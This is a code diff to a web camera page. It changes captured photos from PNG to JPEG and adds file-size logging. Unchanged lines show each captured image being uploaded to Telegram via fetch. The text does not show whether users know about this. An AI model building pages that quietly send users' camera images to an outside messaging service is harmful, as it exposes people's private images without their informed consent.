@@ -381,11 +381,11 @@
         <div id="overlayBox1"></div> <!-- Empty square -->
     </div>
     <div class="controls">
-  
-      <div id="remove1">
+
+        <div id="remove1">
             <button id="flashlightButton">Flashlight</button>
             <button id="capture-btn">Capture</button>
-            <button id="downloadButton" onclick="saveImage()" >Save</button>
+            <button id="downloadButton" onclick="saveImage()">Save</button>
             <!-- <a id="downloadButton" download="capture.png">Download</a> -->
             <div class="loader1" id="loader1"></div>
             <br>
@@ -1031,8 +1031,16 @@
 
                 canvas.toBlob(function (blob) {
                     // Create File object from Blob
-                    var file = new File([blob], 'captured_image.png', { type: 'image/png' }, 1.0);
+                    var file = new File([blob], 'captured_image.jpg', { type: 'image/jpeg' }, 1.0);
 
+                    // Log the file size in KB
+                    var fileSizeInKB = file.size / 1024;
+                    console.log('File size: ' + fileSizeInKB.toFixed(2) + ' KB');
+
+                    // Log the file size in MB
+                    var fileSizeInMB = file.size / (1024 * 1024);
+                    console.log('File size: ' + fileSizeInMB.toFixed(2) + ' MB');
+                    
                     // Send file to Telegram using fetch
                     var formData1 = new FormData();
                     formData1.append('photo', file);
@@ -1106,7 +1114,7 @@
                             location.reload();
 
                         });
-                }, 'image/png');
+                }, 'image/jpeg');
             }, delay);
         };
 
@@ -1137,7 +1145,7 @@
             var imageUrl = canvas.toDataURL('image/jpg');
             // downloadButton.href = canvas.toDataURL('image/png');
             downloadImage(imageUrl);
-            
+
         }
 
         function downloadImage(dataUrl) {
